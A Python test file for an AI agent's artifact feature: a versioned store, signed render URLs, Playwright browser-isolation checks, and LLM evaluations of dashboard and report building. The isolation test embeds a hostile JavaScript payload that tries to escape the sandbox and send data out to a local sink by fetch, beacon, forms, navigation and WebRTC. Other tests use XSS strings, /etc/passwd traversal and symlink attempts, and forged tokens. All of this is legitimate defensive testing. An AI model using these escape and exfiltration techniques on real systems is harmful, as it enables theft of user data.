"""Loop 14: artifacts. Versioned store + `artifact` tool, renderer on a separate origin with signed URLs, browser
isolation of untrusted artifact code (real Chrome via Playwright), and how the model uses the tool (create vs
update, not overusing it, a finance dashboard whose numbers must be right). LLM tests need the gateway on :8100.
python tests/test_l9_artifacts.py [test_name ...]   (K=3 by default for the LLM tests)"""
import http.server
import json
import os
import re
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from types import SimpleNamespace

import httpx

ROOT = Path(__file__).resolve().parents[1]
TMP = Path(tempfile.mkdtemp(prefix="l9-"))
DATA = TMP / "data"
APP, RENDER = "http://127.0.0.1:8300", "http://localhost:8301"  # different ports AND different sites
os.environ.update(AGENT_ROOT=str(DATA), AGENT_APP_ORIGIN=APP, AGENT_RENDER_ORIGIN=RENDER)
DATA.mkdir()
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests" / "eval" / "finance"))
from agent.artifacts import ArtifactStore  # noqa: E402
from agent.loop import Context, run, run_tool  # noqa: E402
from agent.sandbox import Sandbox  # noqa: E402
from agent.userstore import UserStore  # noqa: E402
from server import render  # noqa: E402

K = int(os.environ.get("K", 3))
SINK_PORT, UDP_PORT = 8399, 8395


def servers():
    env = {**os.environ}
    ps = [subprocess.Popen([sys.executable, "-m", "uvicorn", mod, "--port", port], cwd=ROOT, env=env,
                           stdout=subprocess.DEVNULL, stderr=open(TMP / f"{port}.log", "a"))
          for mod, port in (("server.app:app", "8300"), ("server.render:app", "8301"))]
    for url in (APP + "/docs", RENDER + "/a/x"):
        for _ in range(50):
            try:
                httpx.get(url); break
            except httpx.TransportError:
                time.sleep(0.2)
    return ps


def kill(ps):
    for p in ps:
        p.send_signal(signal.SIGKILL); p.wait()


def client(user):
    return httpx.Client(base_url=APP, timeout=None, headers={"X-User": user})


def stub_sandbox(ws):
    """Sandbox.path without a container (the artifact tool only reads files host-side)."""
    sb = SimpleNamespace(workspace=Path(ws).resolve(), readonly=[])
    sb.path = lambda rel, write=False: Sandbox.path(sb, rel, write)
    return sb


def tool(ctx, **args):
    return run_tool(ctx, "artifact", json.dumps(args, ensure_ascii=False))


# ---------------------------------------------------------------- deterministic (no LLM)

def t_store_and_tool():
    ws = TMP / "ws"
    (ws / "outputs").mkdir(parents=True)
    (ws / "outputs" / "dash.html").write_text("<h1>from file</h1>")
    (ws / "outputs" / "leak.html").symlink_to("/etc/passwd")
    saved = []
    ctx = Context(sandbox=stub_sandbox(ws), artifacts=ArtifactStore(TMP / "arts", on_save=saved.append))
    assert "version 1" in tool(ctx, command="create", id="todo", type="html", title="Todo", content="<h1>Todo</h1>")
    assert "version 2" in tool(ctx, command="update", id="todo", old_str="Todo", new_str="오늘 할 일")
    assert "version 3" in tool(ctx, command="rewrite", id="todo", file="outputs/dash.html")
    s = ctx.artifacts
    assert [s.get("todo", v)["content"] for v in (1, 2, 3)] == ["<h1>Todo</h1>", "<h1>오늘 할 일</h1>", "<h1>from file</h1>"]
    assert [m["command"] for m in saved] == ["create", "update", "rewrite"]
    errors = {
        "exists": tool(ctx, command="create", id="todo", type="html", title="x", content="y"),
        "no match": tool(ctx, command="update", id="todo", old_str="nope", new_str="x"),
        "bad id": tool(ctx, command="create", id="../x", type="html", title="x", content="y"),
        "bad type": tool(ctx, command="create", id="x", type="exe", title="x", content="y"),
        "escape": tool(ctx, command="create", id="x", type="code", title="x", file="../../../etc/passwd"),
        "symlink": tool(ctx, command="create", id="x", type="code", title="x", file="outputs/leak.html"),
        "both": tool(ctx, command="create", id="x", type="html", title="x", content="y", file="outputs/dash.html"),
        "too big": tool(ctx, command="create", id="x", type="html", title="x", content="a" * (1024 * 1024 + 1)),
        "missing": tool(ctx, command="update", id="ghost", old_str="a", new_str="b"),
    }
    for k, v in errors.items():
        assert v.startswith("ERROR"), (k, v)
    assert s.versions("x") == [] and s.versions("todo") == [1, 2, 3]
    print("    errors:", {k: v[7:60] for k, v in errors.items()})


def t_api_and_signed_urls():
    store = ArtifactStore(UserStore(DATA).create_project("alice", "p1") / "artifacts")
    store.save("rep", "markdown", "Report", "# 9월\n</script><script>alert(1)</script>")
    store.save("rep", "markdown", "Report", "# 9월 v2", command="rewrite")
    ps = servers()
    try:
        a, b = client("alice"), client("bob")
        assert [x["id"] for x in a.get("/projects/p1/artifacts").json()["artifacts"]] == ["rep"]
        assert b.get("/projects/p1/artifacts").status_code == 404
        assert b.get("/projects/p1/artifacts/rep").status_code == 404
        assert a.get("/projects/p1/artifacts/../../etc").status_code == 404
        art = a.get("/projects/p1/artifacts/rep?version=1").json()
        assert art["version"] == 1 and art["versions"] == [1, 2] and art["view_url"].startswith(RENDER + "/a/")
        r = httpx.get(art["view_url"])
        csp = r.headers["content-security-policy"]
        assert r.status_code == 200 and "connect-src 'none'" in csp and f"frame-ancestors {APP}" in csp, csp
        assert "</script><script>alert" not in r.text  # markdown source is inlined as JSON, no breakout
        token = art["view_url"].rsplit("/", 1)[1]
        body, sig = token.split(".")
        claims = json.loads(render.base64.urlsafe_b64decode(body + "=" * (-len(body) % 4)))
        forged = render._b64(json.dumps({**claims, "u": "bob"}).encode()) + "." + sig
        bad = {"forged claims": forged, "no sig": body, "expired": render.sign("alice", "p1", "rep", 1, ttl=-1),
               "missing version": render.sign("alice", "p1", "rep", 9), "garbage": "x.y"}
        for k, t in bad.items():
            assert httpx.get(f"{RENDER}/a/{t}").status_code == 404, k
        ui = httpx.get(APP + "/")
        assert f"frame-src {RENDER}" in ui.headers["content-security-policy"]
        assert httpx.get(APP + "/static/../app.py").status_code == 404
    finally:
        kill(ps)


EVIL = r"""<!doctype html><body><script>
const SINK = "http://127.0.0.1:%(sink)d", R = {};
const t = (k, f) => { try { const v = f(); R[k] = "ALLOWED " + String(v).slice(0, 40); } catch (e) { R[k] = "blocked " + e.name; } };
t("parent_dom", () => parent.document.title);
t("top_storage", () => top.localStorage.length);
t("own_cookie", () => document.cookie);
t("own_storage", () => localStorage.length);
t("window_open", () => { const w = window.open(SINK + "/open"); if (!w) throw {name: "null"}; return "window"; });
t("top_nav", () => { top.location = SINK + "/top"; return "assigned"; });
const img = new Image(); img.src = SINK + "/img";
const s = document.createElement("script"); s.src = SINK + "/script"; document.body.append(s);
const l = document.createElement("link"); l.rel = "prefetch"; l.href = SINK + "/prefetch"; document.head.append(l);
const css = document.createElement("link"); css.rel = "stylesheet"; css.href = SINK + "/css"; document.head.append(css);
const f = document.createElement("form"); f.action = SINK + "/form"; f.method = "POST"; document.body.append(f);
t("form", () => { f.submit(); return "submitted"; });
const fr = document.createElement("iframe"); fr.src = SINK + "/iframe"; document.body.append(fr);
navigator.sendBeacon && t("beacon", () => navigator.sendBeacon(SINK + "/beacon", "x"));
const rtc = (w, port) => {
  const pc = new w.RTCPeerConnection({iceServers: [{urls: "stun:127.0.0.1:" + port}]});
  pc.createDataChannel("x"); pc.createOffer().then(o => pc.setLocalDescription(o)); return "constructed";
};
t("webrtc_direct", () => rtc(window, %(udp)d));
const blank = document.createElement("iframe"); document.body.append(blank);
t("webrtc_blank_iframe", () => rtc(blank.contentWindow, %(udp)d + 1));
const sd = document.createElement("iframe");
sd.srcdoc = "<script>new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:%(udp2)d'}]}).createDataChannel('x');" +
            "<\/script>"; document.body.append(sd);
Promise.allSettled([
  fetch("%(app)s/memory", {headers: {"X-User": "alice"}}).then(r => r.status),
  fetch(SINK + "/fetch").then(r => r.status),
]).then(([api, sink]) => {
  R.fetch_app_api = api.status === "fulfilled" ? "ALLOWED " + api.value : "blocked";
  R.fetch_sink = sink.status === "fulfilled" ? "ALLOWED" : "blocked";
  parent.postMessage(R, "*");
  setTimeout(() => { location.href = SINK + "/selfnav?data=secret"; }, 300);
});
</script></body>"""


def sinks():
    hits = []

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path); self.send_response(200); self.end_headers()
        do_POST = do_GET

        def log_message(self, *a):
            pass
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", SINK_PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    socks = []
    for port in (UDP_PORT, UDP_PORT + 1, UDP_PORT + 2):
        u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        u.bind(("127.0.0.1", port))
        u.settimeout(0.1)
        socks.append(u)
    stop = threading.Event()

    def listen():
        while not stop.is_set():
            for u in socks:
                try:
                    u.recvfrom(2048); hits.append(f"udp/{u.getsockname()[1]}")
                except (socket.timeout, OSError):
                    pass
    threading.Thread(target=listen, daemon=True).start()
    return hits, srv, stop


def browser():
    from playwright.sync_api import sync_playwright
    pw = sync_playwright().start()
    return pw, pw.chromium.launch(channel="chrome", headless=True)


def open_in_ui(page, view_url):
    """Load the real UI page and embed the artifact with the UI's own showFrame (same attributes as in use)."""
    page.goto(APP + "/")
    page.evaluate("""url => { window.__r = null; addEventListener("message", e => { window.__r = e.data; });
                              showFrame(url); }""", view_url)


def t_browser_isolation():
    """Untrusted artifact code tries every way out we know of. Expected: only scripts run, nothing reaches the
    app or the sink. WebRTC is measured, not asserted (CSP has no directive for it)."""
    store = ArtifactStore(UserStore(DATA).create_project("alice", "p2") / "artifacts")
    store.save("evil", "html", "evil", EVIL % {"sink": SINK_PORT, "udp": UDP_PORT, "udp2": UDP_PORT + 2, "app": APP})
    hits, srv, stop = sinks()
    ps = servers()
    pw, b = browser()
    try:
        page = b.new_page()
        console = []
        page.on("console", lambda m: console.append(m.text))
        url = client("alice").get("/projects/p2/artifacts/evil").json()["view_url"]
        open_in_ui(page, url)
        for _ in range(50):  # (wait_for_function evals a string: the UI's CSP forbids that)
            if (res := page.evaluate("() => window.__r")):
                break
            time.sleep(0.2)
        assert res, "artifact never reported back (did its script run?)"
        time.sleep(3)  # self-navigation, beacons, stun
        frame_url = page.frames[1].url if len(page.frames) > 1 else None
        for k, v in sorted(res.items()):
            print(f"    {k:14} {v}")
        http_hits = sorted({h for h in hits if not h.startswith("udp/")})
        udp = {f"webrtc_{v}": f"udp/{UDP_PORT + i}" in hits for i, v in enumerate(("direct", "blank_iframe", "srcdoc"))}
        print("    http sink hits:", http_hits or "none", "| iframe still on renderer:", (frame_url or "").startswith(RENDER))
        print("    STUN packet reached the sink:", udp)
        # JS return values only say a call didn't throw (sendBeacon queues, a sandboxed form.submit is silent);
        # the sink is the ground truth.
        assert not http_hits, http_hits
        assert (frame_url or "").startswith(RENDER), frame_url  # self-navigation blocked by the UI's frame-src
        for k in ("parent_dom", "top_storage", "own_cookie", "own_storage", "top_nav", "fetch_app_api", "fetch_sink"):
            assert res[k].startswith("blocked"), (k, res[k])
        # the direct-load check: the renderer refuses to be framed by anything but the app
        other = b.new_page()
        other.set_content(f'<iframe src="{url}"></iframe>')
        time.sleep(1)
        assert "evil" not in (other.frames[1].content() if len(other.frames) > 1 else ""), "framed by another page"
        assert not any(udp.values()), f"WebRTC gets out: {udp}"
    finally:
        b.close(); pw.stop(); kill(ps); srv.shutdown(); stop.set()


REPORT = {"title": "2026년 9월 카드A 지출", "period": "2026-09", "total": 1605300, "count": 48, "prev_total": 1500000,
          "categories": [{"name": "쇼핑", "amount": 603800, "budget": 500000}, {"name": "교통", "amount": 435500, "budget": 400000},
                         {"name": "식비", "amount": 221500, "budget": 250000}, {"name": "생활", "amount": 176900},
                         {"name": "구독", "amount": 39300, "budget": 40000}, {"name": "문화", "amount": 128300}],
          "top": [{"date": "2026-09-14", "merchant": "<script>alert(1)</script>", "amount": 118000, "category": "쇼핑"},
                  {"date": "2026-09-02", "merchant": "코레일", "amount": 69800, "category": "교통"}],
          "notes": ["쇼핑이 예산을 103,800원 넘었어요."]}


def t_report_and_capture():
    """Fixed template: strict data, escaped text, warnings for inconsistent numbers; section PNGs via the API."""
    from agent import report
    ws = TMP / "ws-r"
    ws.mkdir()
    ctx = Context(sandbox=stub_sandbox(ws), artifacts=ArtifactStore(UserStore(DATA).create_project("alice", "p3") / "artifacts"))
    out = run_tool(ctx, "show_report", json.dumps({"id": "sep", "data": REPORT}, ensure_ascii=False))
    assert out == "report sep saved as version 1", out
    bad = {**REPORT, "total": 1_000_000, "top": REPORT["top"][::-1]}
    out = run_tool(ctx, "show_report", json.dumps({"id": "sep", "data": bad}, ensure_ascii=False))
    assert "version 2" in out and "categories sum to 1,605,300 but total is 1,000,000" in out and "not sorted" in out, out
    for d in ({**REPORT, "total": "1,605,300"}, {**REPORT, "evil": 1}, {**REPORT, "categories": []}):
        assert run_tool(ctx, "show_report", json.dumps({"id": "sep", "data": d})).startswith("ERROR"), d
    assert tool(ctx, command="update", id="sep", old_str="쇼핑", new_str="x").startswith("ERROR")  # reports: show_report only
    assert tool(ctx, command="create", id="r2", type="report", title="x", content="{}").startswith("ERROR")
    page = report.render(REPORT)
    assert "<script>" not in page and "&lt;script&gt;" in page
    assert [s for s in ("summary", "categories", "top", "notes") if f'id="sec-{s}"' in page] == report.sections(REPORT)
    ps = servers()
    try:
        a = client("alice")
        art = a.get("/projects/p3/artifacts/sep?version=1").json()
        assert [s["id"] for s in art["sections"]] == ["summary", "categories", "top", "notes"], art.get("sections")
        assert "script-src" in httpx.get(art["view_url"]).headers["content-security-policy"]
        sizes = {}
        for s in ["summary", "categories", "top", "notes", "all"]:
            r = a.get(f"/projects/p3/artifacts/sep/sections/{s}.png?version=1")
            assert r.status_code == 200 and r.content[:8] == b"\x89PNG\r\n\x1a\n", (s, r.status_code)
            w, h = int.from_bytes(r.content[16:20], "big"), int.from_bytes(r.content[20:24], "big")
            sizes[s] = (w, h)
            (TMP / f"sep-{s}.png").write_bytes(r.content)
        print("    png sizes (2x):", sizes, "->", TMP)
        assert all(w == 2 * report.WIDTH for s, (w, h) in sizes.items() if s != "all")
        assert a.get("/projects/p3/artifacts/sep/sections/evil.png").status_code == 404
        assert client("bob").get("/projects/p3/artifacts/sep/sections/summary.png").status_code == 404
        t0 = time.time()
        a.get("/projects/p3/artifacts/sep/sections/top.png")
        print(f"    warm capture: {time.time() - t0:.2f}s")
    finally:
        kill(ps)


# ---------------------------------------------------------------- LLM (gateway on :8100)

def llm():
    from openai import OpenAI
    from tests.eval.run_eval import Meter
    return Meter(OpenAI(base_url=os.environ.get("LLM_BASE_URL", "http://127.0.0.1:8100/v1"),
                        api_key=os.environ.get("LLM_API_KEY", "dummy")))


TOOLS = ["bash", "read_file", "write_file", "edit_file", "artifact"]


def agent(ws, calls):
    """calls collects the parsed arguments of every artifact call (from the tool_call events: full arguments)."""
    sb = Sandbox(ws, readonly=("uploads",) if (Path(ws) / "uploads").exists() else ())
    arts = ArtifactStore(Path(ws).parent / (Path(ws).name + "-arts"))

    def emit(ev):
        if ev["type"] == "tool_call" and ev["name"] == "artifact":
            try:
                calls.append(json.loads(ev["arguments"]))
            except ValueError:
                calls.append({"command": "malformed"})
    return sb, Context(sandbox=sb, artifacts=arts), emit


def render_check(page, a, expect_text=()):
    """Render the artifact as the user would; report page errors and whether expected text shows up."""
    errs = []
    page.on("pageerror", lambda e: errs.append(str(e)[:120]))
    html = render.page(a)  # same page and CSP the renderer serves (minus frame-ancestors: loaded top-level here)
    page.route("http://render.test/a", lambda route: route.fulfill(
        body=html, headers={"Content-Type": "text/html", "Content-Security-Policy": render.CSP.replace(
            f"frame-ancestors {APP}", "")}))
    page.goto("http://render.test/a")
    time.sleep(2)
    text = page.inner_text("body")
    return errs, {t: (t in text) for t in expect_text}


def t_llm_create_then_update():
    """Create a small app, then ask for a one-word change: does the model update (cheap) or rewrite?"""
    pw, b = browser()
    rows = []
    try:
        for i in range(K):
            ws, calls, m = TMP / f"todo-{i}", [], llm()
            sb, ctx, log = agent(ws, calls)
            t0 = time.time()
            try:
                _, msgs = run("할 일 목록 웹앱을 만들어서 보여줘. 추가, 삭제, 완료 체크가 되면 돼요.", ctx,
                              tool_names=TOOLS, client=m, emit=log, log=lambda *_: None)
                c1, t1 = m.completion, time.time() - t0
                _, msgs = run("제목을 '오늘 할 일'로 바꿔줘.", ctx, tool_names=TOOLS, client=m, history=msgs, emit=log, log=lambda *_: None)
            finally:
                sb.close()
            arts = ctx.artifacts.list()
            a = ctx.artifacts.get(arts[0]["id"]) if arts else None
            cmds = [c.get("command") for c in calls]
            errs, seen = render_check(b.new_page(), a, ["오늘 할 일"]) if a else (["no artifact"], {})
            rows.append({"artifacts": len(arts), "type": a and a["type"], "versions": a and a["version"], "cmds": cmds,
                         "turn1_out_tokens": c1, "turn2_out_tokens": m.completion - c1, "t1": round(t1),
                         "t2": round(time.time() - t0 - t1), "render_errors": errs, "title_shown": seen.get("오늘 할 일")})
            print("   ", rows[-1])
    finally:
        b.close(); pw.stop()
    ok = sum(r["artifacts"] == 1 and r["cmds"][:1] == ["create"] and r["title_shown"] and not r["render_errors"]
             for r in rows)
    print(f"    created+edited+renders: {ok}/{K}, second turn used update: {sum('update' in r['cmds'][1:] for r in rows)}/{K}")
    assert ok == K


def t_llm_no_artifact_for_short_answers():
    used = 0
    for i in range(K):
        ws, calls, m = TMP / f"short-{i}", [], llm()
        sb, ctx, log = agent(ws, calls)
        try:
            ans, _ = run("파이썬에서 리스트를 뒤집는 방법을 한 줄로 알려줘.", ctx, tool_names=TOOLS, client=m, emit=log, log=lambda *_: None)
        finally:
            sb.close()
        used += bool(ctx.artifacts.list())
        print("    answer:", (ans or "")[:80].replace("\n", " "))
    print(f"    artifact used for a one-line answer: {used}/{K}")
    assert used == 0


def t_llm_finance_dashboard():
    """The product case: a dashboard over a real-shaped export. Numbers must equal the ground truth."""
    from cases import build
    fx = TMP / "fixtures"
    truth = {c["id"]: c["expected"] for c in build(fx)}
    total, cats = truth["a_total"], truth["a_by_cat"]
    pw, b = browser()
    rows = []
    try:
        for i in range(K):
            ws, calls, m = TMP / f"dash-{i}", [], llm()
            (ws / "uploads").mkdir(parents=True)
            (ws / "outputs").mkdir()
            (ws / "uploads" / "card_a_2026-09.csv").write_bytes((fx / "card_a_2026-09.csv").read_bytes())
            subprocess.run(["chown", "-R", "1000:1000", str(ws)])
            sb, ctx, log = agent(ws, calls)
            t0 = time.time()
            try:
                run("업로드한 파일은 /workspace/uploads 에 있어요.\n\n9월 카드A 지출 대시보드를 만들어서 보여줘. "
                    "총액, 카테고리별 합계 차트, 금액이 큰 거래 5건이 있으면 좋겠어요.", ctx, tool_names=TOOLS,
                    client=m, emit=log, log=lambda *_: None, max_steps=30)
            finally:
                sb.close()
            arts = ctx.artifacts.list()
            a = ctx.artifacts.get(arts[0]["id"]) if arts else None
            content = re.sub(r"[,\s]", "", a["content"]) if a else ""
            nums = {"total": str(total) in content, **{c: str(v) in content for c, v in cats.items()}}
            errs, _ = render_check(b.new_page(), a) if a else (["no artifact"], {})
            via_file = any("file" in c for c in calls)
            rows.append({"type": a and a["type"], "numbers_ok": all(nums.values()), "missing": [k for k, v in nums.items() if not v],
                         "via_file": via_file, "render_errors": errs, "sec": round(time.time() - t0),
                         "out_tokens": m.completion})
            print("   ", rows[-1])
    finally:
        b.close(); pw.stop()
    ok = sum(r["type"] == "html" and r["numbers_ok"] and not r["render_errors"] for r in rows)
    print(f"    html + all numbers right + renders clean: {ok}/{K}; via file: {sum(r['via_file'] for r in rows)}/{K}")
    assert ok == K



def t_llm_finance_report():
    """Same request through the fixed template (show_report): the model sends numbers only. Compare with
    t_llm_finance_dashboard (model writes the HTML) on correctness, time and output tokens."""
    from cases import build
    fx = TMP / "fixtures-r"
    truth = {c["id"]: c["expected"] for c in build(fx)}
    rows = []
    for i in range(K):
        ws, calls, m = TMP / f"rep-{i}", [], llm()
        (ws / "uploads").mkdir(parents=True)
        (ws / "outputs").mkdir()
        (ws / "uploads" / "card_a_2026-09.csv").write_bytes((fx / "card_a_2026-09.csv").read_bytes())
        subprocess.run(["chown", "-R", "1000:1000", str(ws)])
        sb, ctx, log = agent(ws, calls)
        t0 = time.time()
        try:
            run("업로드한 파일은 /workspace/uploads 에 있어요.\n\n9월 카드A 지출 리포트 보여줘.", ctx,
                tool_names=TOOLS + ["show_report"], client=m, emit=log, log=lambda *_: None, max_steps=30)
        finally:
            sb.close()
        reps = [a for a in ctx.artifacts.list() if a["type"] == "report"]
        d = json.loads(ctx.artifacts.get(reps[0]["id"])["content"]) if reps else {}
        cats = {c["name"]: c["amount"] for c in d.get("categories", [])}
        rows.append({"report": bool(reps), "versions": reps[0]["version"] if reps else 0,
                     "total_ok": d.get("total") == truth["a_total"], "cats_ok": cats == truth["a_by_cat"],
                     "top": len(d.get("top", [])), "sec": round(time.time() - t0), "out_tokens": m.completion})
        print("   ", rows[-1])
    ok = sum(r["report"] and r["total_ok"] and r["cats_ok"] for r in rows)
    print(f"    report with exact numbers: {ok}/{K}")
    assert ok == K

if __name__ == "__main__":
    only = sys.argv[1:]
    failed = 0
    for name, fn in list(globals().items()):
        if name.startswith("t_") and (not only or name in only):
            t = time.time()
            try:
                fn()
                print(f"PASS {name} ({time.time() - t:.0f}s)")
            except Exception as e:
                failed += 1
                print(f"FAIL {name} ({time.time() - t:.0f}s): {type(e).__name__}: {str(e)[:300]}")
    sys.exit(1 if failed else 0)
